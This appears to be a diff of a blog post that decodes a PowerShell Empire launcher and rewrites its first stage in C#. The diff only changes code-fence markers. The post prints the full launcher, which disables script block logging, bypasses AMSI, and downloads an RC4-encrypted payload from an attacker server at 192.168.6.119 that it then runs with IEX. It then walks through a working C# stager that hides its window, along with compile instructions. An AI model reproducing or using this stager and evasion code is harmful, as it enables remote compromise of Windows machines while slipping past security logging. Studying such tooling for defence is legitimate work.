@@ -20,7 +20,7 @@ This is how you generate a Launcher:
 
 This is the base64 script decoded:
 
-```console
+```
 If($PSVErSioNTaBLe.PSVErSIoN.MAjor -gE 3){$GPF=[rEf].AsSeMblY.GetTYpE('System.Management.Automation.Utils')."GeTFie`Ld"('cachedGroupPolicySettings','N'+'onPublic,Static');If($GPF){$GPC=$GPF.GeTValUE($NULL);IF($GPC['ScriptB'+'lockLogging']){$GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPC['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}$Val=[ColLECTionS.GENeric.DIcTiOnarY[STriNG,SystEm.Object]]::NEw();$vAL.ADD('EnableScriptB'+'lockLogging',0);$VAL.AdD('EnableScriptBlockInvocationLogging',0);$GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$vAL}ElSe{[ScRIPtBloCk]."GETFIE`lD"('signatures','N'+'onPublic,Static').SetVALUe($nuLl,(New-OBJect COllEcTIONs.GenErIC.HASHSet[sTRInG]))}[REF].AsSEMBLY.GEtTypE('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GeTFIeld('amsiInitFailed','NonPublic,Static').SETVALUe($null,$true)};};[SystEM.NeT.SErvicEPOINTManAGeR]::EXPeCt100CoNTinUe=0;$wC=New-ObJecT SYsTem.NET.WeBCLIENt;$u='Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)';$WC.HEaDERS.ADd('User-Agent',$u);$wC.PRoxY=[SYsteM.NET.WEbRequest]::DeFAulTWEbPROxY;$wC.Proxy.CREdentIaLs = [SyStEM.NEt.CReDenTiaLCACHE]::DefAultNEtWorkCReDEntiALs;$Script:Proxy = $wc.Proxy;$K=[SYsTEm.TEXT.ENcODinG]::ASCII.GeTBYtEs('fdcece0a22c10f83dccc8f17c95a33d4');$R={$D,$K=$ARGs;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}};$ser='http://192.168.6.119:80';$t='/CWoNaJLBo/VTNeWw11212/';$wc.HeADeRs.AdD("Accept","image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*");$Wc.HeaDeRs.Add("Accept-Language","en-en");$WC.HEADErS.AdD("Cookie","session=pRWdj48/Lf2wTAhO2Y7BXpRHz6o=");$DAtA=$WC.DOWnlOADDAtA($SEr+$T);$iv=$datA[0..3];$Data=$DATa[4..$DATA.LENgTh];-jOiN[ChaR[]](& $R $Data ($IV+$K))|IEX
 ```
 
@@ -78,7 +78,7 @@ $Data=$DATa[4..$DATA.LENgTh];
 
 Next let's remove the IF part, for simplification, and focus on the rest of the code, I also organized it a little bit, so we can group the parts that work together and explain each one separately.
  
-```console
+```
 [System.Net.ServicePointManager]::Expect100Continue=0;
  
 $wc=New-Object System.Net.WebClient;
@@ -110,7 +110,7 @@ $S[$I],$S[$H]=$S[$H],$S[$I];
 $_-bXOr$S[($S[$I]+$S[$H])%256]}};
  
 -Join[Char[]](& $R $data ($IV+$K))|IEX
-```console
+```
 
 Now we need to convert each part of this code into C#. I enjoyed a lot learning some .Net classes while doing this research. Let's start line by line.
  
@@ -118,13 +118,13 @@ Now we need to convert each part of this code into C#. I enjoyed a lot learning 
  
 The **System.Net.ServicePointManager.Expect100Continue** in simple words, this property if true, the client requests that use the PUT and POST methods will add an Expect header to the request. For more information check the [link](https://msdn.microsoft.com/en-us/library/system.net.servicepointmanager.expect100continue(v=vs.110).aspx)
  
-```console
+```
 # PowerShell avoid sending Expect 100 Header 
 [System.Net.ServicePointManager]::Expect100Continue=0;
  
 // C# avoid sending Expect 100 Header 
 System.Net.ServicePointManager.Expect100Continue = false;
-```console
+```
 
 # Server Connection
  
@@ -134,7 +134,7 @@ Basically the 1st stage is responsible for creating a connection to the attacker
  
 The **Web.Client** object include all pieces of to perform web communication. In case the target is using proxy to communicate to other networks, the **DefaultWebProxy** and **DefaultNetworkCredentials** properties are used to provide Authentication and connection through Proxy Server, if necessary. I didn't convert the proxy part of the code, it was not necessary for my investigation, is up to you to convert it if you need it.
  
-```console
+```
 # PowerShell Create WebClient Object
 $wc=New-Object System.Net.WebClient;
 $u='Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)';
@@ -153,11 +153,11 @@ WebClient wc = new WebClient();
 string ua = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
 wc.Headers["User-Agent"] = ua;
 wc.Headers["Cookie"] = "session=968PH6bE9CDkwYGfsUPraz0x5PQ=";
-```console
+```
 
 Then we need to specify the server address, port and the target location, in our case this is the full URL http://192.168.6.119:80/CWoNaJLBo/VTNeWw11212/. After that, we call the DownloadData method from the Web.Client class to save the data in the $data variable. If you are curious about the data (2nd stage payload) is usually located in /opt/Empire/data/agent/stagers/http.ps1.
  
-```console
+```
 # PoweShell Set Server Address and Download the data.
 $ser='http://192.168.6.119:80';
 $t='/CWoNaJLBo/VTNeWw11212/';
@@ -167,7 +167,7 @@ $data=$wc.DownloadData($ser+$t); # Download
 string server = "http://192.168.6.119:8081";
 string target = "/CWoNaJLBo/VTNeWw11212/";
 byte[] data = wc.DownloadData(server + target); // Download
-```console
+```
 
 # Cryptologically Secure Communication 
  
@@ -179,40 +179,40 @@ The **Key** is generated when you execute your launcher, in PowerEmpire is calle
 
 ![pse_stagingkey](/assets/images/pse_stagingkey.png)
  
-```console
+```
 // PowerShell Key Value for Decryption
 $K=[System.Text.Encoding]::ASCII.GetBytes('fdcece0a22c10f83dccc8f17c95a33d4');
  
 // C# Key value for decryption
 string key = "fdcece0a22c10f83dccc8f17c95a33d4";
 byte[] K = Encoding.ASCII.GetBytes(key);
-```console
+```
 
 The **IV** is a random value that we got from the data (2nd stage) we downloaded, that value are the first 4 bytes of the data array. The IV is responsible for making the Empire Communication random each time it downloads the 2nd stage.
  
-```console
+```
 // PowerShell Extract IV from data
 $iv=$data[0..3];
  
 // C# Extract IV from data
 byte[] iv = data.Take(4).Select(i => i).ToArray();
-```console
+```
 
 Finally, we remove the IV from the data, because those are not data just that random value:
 
-```console
+```
 // PowerShell Remove IV from data
 $data=$data[4..$data.Length];
  
 // C# Remove the IV from the data
 byte[] data_noIV = data.Skip(4).ToArray();
-```console
+```
 
 # RC4 Encryption
  
 This is where all the magic happen, if you clicked the link about Harm0jy blog post about RC4 you'll understand what this piece of code is, this is the minimization of RC4 implementation for decrypting, or executing, malware communications. For C# I found 2 RC4 classes which I just copied and paste, the one I used in the code was created by Jeong ChangWook, here his [source](https://gist.github.com/hoiogi/89cf2e9aa99ffc3640a4)
  
-```console
+```
 // PowerShell RC4 function to decrypt the stage 2 data.
 $R={$D,$K=$ARGs;
 $S=0..255;
@@ -269,11 +269,11 @@ public class RC4
 		return Encrypt(pwd, data);
 	}
 }
-```console
+```
 
 The last part is responsible for joining everything together. We can divide the Join in 2 pieces, the 1st one is the RC4 decryption part which use the $R minimization script, the data as argument and the combination of the IV + K as the decrypt value. You can execute  **& $R $data ($IV+$K)** alone so you can see the RC4 in action, and then Join all to finally Invoke-Execution (IEX).
 
-```console
+```
 //PowerShell Code
 -Join[Char[]](& $R $data ($IV+$K))|IEX
  
@@ -288,13 +288,13 @@ byte[] decrypted = RC4.Decrypt(IVK, data_noIV);
  
 // Convert the stage2 decrypted message from bytes to ASCII
 string stage2 = System.Text.Encoding.ASCII.GetString(decrypted);
-```console
+```
 
 # C# Execution
  
 To execute code in C# we can use the PowerShell class or the RunSpace and Pipeline classes, this is because the stage 2 payload is in PowerShell. We'll use PowerShell class because for some reasons RunSpace and Pipeline classes didn't work for me. In PowerShell we execute using Invoke-Execution or IEX.
 
-```console
+```
 // Create a PowerShell Object to execute the command 
 PowerShell PowerShellInstance = PowerShell.Create();
  
@@ -303,19 +303,19 @@ PowerShellInstance.AddScript(stage2);
  
 // Execute the Script!
 PowerShellInstance.Invoke();
-```console
+```
 
 Before we use the Invoke() method, we need to add two variables to the equation, those are $ser and $u. If you look at the stage2 string, you'll notice that it executes a function call for **Start-Negotiate -s "$ser" -SK 'REPLACE_STAGING_KEY' -UA $u** so, we need to pass the $ser and $u variables to get execution, otherwise we would get an error.
 
-```console
+```
 // Create the variables $ser and $u which are part of the downloaded stage2
 PowerShellInstance.Runspace.SessionStateProxy.SetVariable("ser", server);
 PowerShellInstance.Runspace.SessionStateProxy.SetVariable("u", ua);
-```console
+```
 
 Finally, I added some extra functions to hide the cmd window, you will find information about then in the comments. Now let's put the C# code all together and execute our C# empire payload. The final code should look like:
 
-```console
+```
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -444,15 +444,15 @@ namespace PSEmpire_Stage1
         }
     }
 }
-```console
+```
 
 Now modify this code to include your variables, you need to change Key, server, target and cookie. If you don't know what are yours, just execute launcher command, use base64 to decode your script and check those values.
 
 To compile you can use csc.exe, and reference the System.Management.Automation.dll. Example: Save your code in PSEmpireStage1.cs and use the Developer Command Prompt.
 
-```console 
+``` 
 csc.exe PSEmpireStage1.cs /reference:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
-```console
+```
 
 A Quick video of Execution! 
  
